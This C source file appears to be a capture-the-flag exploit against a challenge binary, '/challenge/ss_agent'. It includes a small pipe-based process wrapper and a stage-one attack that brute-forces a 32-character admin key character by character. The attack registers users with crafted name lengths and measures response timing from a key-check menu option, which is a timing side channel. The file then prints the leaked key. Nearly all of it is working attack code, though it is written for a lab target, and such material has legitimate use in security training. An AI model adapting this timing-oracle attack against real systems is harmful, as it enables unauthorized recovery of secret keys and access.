#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/time.h>
#include <assert.h>
#include <sys/types.h>
#include <signal.h>    // for kill
#include <sys/wait.h>

struct tube {
	pid_t pid;
	int readfd;
	int writefd;
	char readbuf[4096];
	char *pstart;
	char *pcurrent;
	char *pend;
};

struct tube *tube_new(char *exec_filename) {
	struct tube *t = malloc(sizeof(struct tube));

	int pipestdin[2];
	int pipestdout[2];
	pipe(pipestdin);
	pipe(pipestdout);

	pid_t pid = fork();
	if (pid == 0) {
		close(pipestdin[1]);
		close(pipestdout[0]);
		if (pipestdin[0] != 0) {
			dup2(pipestdin[0], 0);
			close(pipestdin[0]);
		}
		if (pipestdout[1] != 1) {
			dup2(pipestdout[1], 1);
			close(pipestdout[1]);
		}
		execlp(exec_filename, exec_filename, NULL);
		exit(0);
	}
	close(pipestdin[0]);
	close(pipestdout[1]);

	t->pid = pid;
	t->readfd = pipestdout[0];
	t->writefd = pipestdin[1];
	return t;
}

void tube_close(struct tube *t) {
	close(t->readfd);
	close(t->writefd);
	kill(t->pid, 9);
	waitpid(-1, NULL, 0);
	free(t);
}

void tube_send(struct tube *t, const char *buf, int len) {
	write(t->writefd, buf, len);
}

void tube_sendline(struct tube *t, const char *buf, int len) {
	write(t->writefd, buf, len);
	write(t->writefd, "\n", 1);
}

int tube_recv(struct tube *t, char *buf, int len) {
	return read(t->readfd, buf, len);
}

int tube_recvn(struct tube *t, char *buf, int len) {
	int result = 0;
	int remain = len;
	while (remain > 0) {
		int r = read(t->readfd, buf+(len-remain), remain);
		if (r < 0) {
			break;
		}
		remain -= r;
		result = len-remain;
	}
	return result;
}

int tube_recvuntil(struct tube *t, char *buf, int maxlen, char *delim, int delimlen, int drop) {
	int result = 0;
	if (maxlen == 0) {
		assert(delimlen < 4096);
		char b[4096];
		char bl = 0;
		while (1) {
			int r = read(t->readfd, &b[bl], 1);
			//printf("DEBUG: %c %d %d %d\n", b[bl], b[bl], bl, delimlen);
			if (r <= 0) {
				assert(0);
			}
			bl += r;
			result += r;
			if (bl == delimlen) {
				if (memcmp(b, delim, delimlen) == 0) {
					return result;
				}
				else {
					memmove(b, b+1, delimlen-1);
					bl -= 1;
				}
			}
		}
	}
	else {
		assert(0);
	}
	return result;
}

void tube_sendafter(struct tube *t, char *delim, int delimlen, const char *buf, int len) {
	tube_recvuntil(t, NULL, 0, delim, delimlen, 0);
	tube_send(t, buf, len);
}

void tube_sendlineafter(struct tube *t, char *delim, int delimlen, const char *buf, int len) {
	tube_recvuntil(t, NULL, 0, delim, delimlen, 0);

	tube_sendline(t, buf, len);
}

// =============================================================================

struct tube *global_t = NULL;

long gettime(void) {
	struct timeval tv;
	gettimeofday(&tv, NULL);
	return tv.tv_sec * 1000 * 1000 + tv.tv_usec;
}

void register_user(const char *name, int realnamelen, int namelen) {
	char buf[4096] = {0};
	char d1[] = "Input your choice:";
	tube_sendlineafter(global_t, d1, strlen(d1), "1", 1);
	char d2[] = "How long is your name ?";
	sprintf(buf, "%d", namelen);
	tube_sendlineafter(global_t, d2, strlen(d2), buf, strlen(buf));
	char d3[] = "What is your name ?";
	tube_sendlineafter(global_t, d3, strlen(d3), name, realnamelen);
	if (realnamelen < namelen) {
		tube_send(global_t, "\n", 1);
	}
	char d4[] = "Successfully register";
	tube_recvuntil(global_t, NULL, 0, d4, strlen(d4), 0);
}

int kick_out_last_registered_user(char *admin_key, int admin_key_len, long *out_timeinterval) {
	int result = 0;

	assert(admin_key_len == 32);
	char d1[] = "Input your choice:";
	tube_sendlineafter(global_t, d1, strlen(d1), "4", 1);
	char d2[] = "Input admin key:\n";
	tube_sendlineafter(global_t, d2, strlen(d2), admin_key, admin_key_len);
	char d3[] = "Checking...\n";
	tube_recvuntil(global_t, NULL, 0, d3, strlen(d3), 0);

	long t1 = gettime();

	char b[1];
	tube_recvn(global_t, b, 1);
	long t2 = gettime();

	if (out_timeinterval != NULL) {
		*out_timeinterval = t2-t1;
	}

	if (b[0] == 'E') {
		result = 0;
	}
	else if (b[0] == 'P') {
		result = 1;
	}
	else {
		assert(0);
	}
	return result;
}

// =============================================================================

char validchars[] = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

int main(void) {
	global_t = tube_new("/challenge/ss_agent");

	char guesskey[32+1] = {0};
	memset(guesskey, '0', 32);
	for (int i = 0; i < 32; i++) {
		char choose = '0';
		long maxtime = 0;
		for (int j = 0; j < 62; j++) {
			char c = validchars[j];
			register_user("", 0, 4096-8-1-i);
			long timeinterval;
			guesskey[i] = c;
			int r = kick_out_last_registered_user(guesskey, 32, &timeinterval);
			if (r) {
				choose = c;
				break;
			}
			//printf("%d %c %d %ld\n", i, c, r, timeinterval);    // average is 80us, seldom 1144us, guess true is 5000us
			if (timeinterval > maxtime) {
				maxtime = timeinterval;
				choose = c;
			}
		}
		guesskey[i] = choose;
		printf("%s\n", guesskey);
	}

	printf("exp_stage1_leak finshed, admin_key: \n");
	printf("%s\n", guesskey);

	return 0;
}

